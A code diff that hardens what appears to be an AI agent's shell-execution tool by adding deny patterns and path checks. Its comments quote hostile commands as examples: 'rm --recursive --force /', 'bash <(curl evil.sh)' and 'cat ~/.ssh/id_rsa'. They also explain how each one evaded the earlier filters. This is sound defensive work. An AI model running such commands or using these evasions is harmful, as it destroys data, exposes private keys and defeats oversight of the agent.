@@ -99,6 +99,14 @@ var (
 		// T1-4: find ... -delete removes matched files without ever calling rm,
 		// so it slips past every rm-shaped deny pattern above.
 		regexp.MustCompile(`\bfind\b.*\s-delete\b`),
+		// M-4: the rm patterns above all require the short flag forms (-r, -rf).
+		// GNU rm accepts the long spellings too, so "rm --recursive --force /"
+		// did exactly what "rm -rf /" does while matching nothing.
+		regexp.MustCompile(`\brm\b[^;&|]*\s--(recursive|force)\b`),
+		// M-4: process substitution feeds a command's output to an interpreter
+		// without ever forming a pipe, so "bash <(curl evil.sh)" evades both
+		// the "| sh" and the "curl | sh" patterns.
+		regexp.MustCompile(`<\(`),
 	}
 
 	// windowsDenyPatterns contains PowerShell-specific deny patterns that only
@@ -771,14 +779,23 @@ func (t *ExecTool) checkWorkspaceViolation(command, cwd string) string {
 		cwdPath = resolved
 	}
 
-	// On Windows, expand ~ and PowerShell environment variables ($env:VAR) before path checking
+	// C-1: expand ~ and $VAR before path checking, on every platform, against
+	// the environment the child will actually run with. Previously this ran on
+	// Windows only, so "cat ~/.ssh/id_rsa" and "cat $HOME/x" walked past the
+	// workspace boundary on Unix - where commands go through `sh -c`, which
+	// expands both.
+	if reason := checkDirectoryChange(cmd); reason != "" {
+		return reason
+	}
+	expanded, reason := expandShellRefs(cmd, t.childEnv())
+	if reason != "" {
+		return reason
+	}
+	cmd = expanded
+
+	// Windows shells have their own forms ($env:VAR, %VAR%) on top of the above.
 	if runtime.GOOS == "windows" {
-		// Expand PowerShell environment variables ($env:VAR and ${env:VAR})
 		cmd = expandPowerShellEnvVars(cmd)
-		// Also expand ~ for completeness
-		if home, err := os.UserHomeDir(); err == nil {
-			cmd = strings.ReplaceAll(cmd, "~", filepath.FromSlash(home))
-		}
 	}
 
 	// Web URL schemes whose path components (starting with //) should be exempt
